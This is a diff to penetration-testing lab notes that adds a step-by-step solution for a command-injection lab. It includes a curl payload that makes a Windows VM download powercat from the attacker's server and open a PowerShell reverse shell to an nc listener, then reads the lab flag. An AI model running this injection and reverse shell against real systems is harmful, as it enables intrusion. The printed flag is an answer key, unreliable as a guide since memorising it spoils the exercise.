@@ -143,9 +143,92 @@ Successfull reverse shell connection via Command Injection
 
 Lab 1 - Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
 >``` shell
+># Verify Command Injection Works
+>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.118.189:8000/archive
 >
+># ========== Expected Result ==========
+>...
+>Windows IP Configuration
+>
+>
+>Ethernet adapter Ethernet0:
+>
+>   Connection-specific DNS Suffix  . : 
+>   IPv4 Address. . . . . . . . . . . : 192.168.118.189
+>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+>   Default Gateway . . . . . . . . . : 192.168.118.254
+>
+># =====================================
+>
+># Download Powercat script
+>kali@kali:~$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+>
+># ========== Expected Result ==========
+>--2025-11-18 11:00:54--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+>Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+>HTTP request sent, awaiting response... 200 OK
+>Length: 37667 (37K) [text/plain]
+>Saving to: ‘powercat.ps1.2’
+>
+>powercat.ps1.2         100%[============================>]  36.78K  --.-KB/s    in 0.008s  
+>
+>2025-11-18 11:00:54 (4.73 MB/s) - ‘powercat.ps1.2’ saved [37667/37667]
+># =====================================
+>
+># Start a Python Web Server
+>kali@kali:~$ python3 -m http.server 80
+>
+># ========== Expected Result ==========
+>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+># =====================================
+>
+># Start Netcat Listener
+>nc -lvnp 4444
+>
+># ========== Expected Result ==========
+>listening on [any] 4444 ...
+># =====================================
+>
+># Exploit the Web App With Payload (Target: 192.168.118.189, Kali IP: 192.168.45.203)
+>curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.203%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.203%20-p%204444%20-e%20powershell' http://192.168.118.189:8000/archive
+>
+># ========== Expected Result ==========
+>connect to [192.168.45.203] from (UNKNOWN) [192.168.118.189] 59393
+>Windows PowerShell
+>Copyright (C) Microsoft Corporation. All rights reserved.
+>
+>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+>
+>
+>PS C:\Users\Administrator\Documents\meteor>
+># =====================================
+>
+>
+>PS C:\Users\Administrator\Documents\meteor> cd C:\Users\Administrator\Desktop
+>
+>PS C:\Users\Administrator\Desktop> dir
+>
+># ========== Expected Result ==========
+>dir
+>
+>
+>    Directory: C:\Users\Administrator\Desktop
+>
+>
+>Mode                 LastWriteTime         Length Name                                                                 
+>----                 -------------         ------ ----                                                                 
+>-a----        11/18/2025   8:40 AM             38 secrets.txt
+># =====================================
+>
+>PS C:\Users\Administrator\Desktop> type secrets.txt
+>
+># ========== Expected Result ==========
+>type secrets.txt
+>OS{ceb86d2cd9259de098bd192693fe0e16}
+># =====================================
 >```
->
+>OS{ceb86d2cd9259de098bd192693fe0e16}
 
 Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
 >``` shell
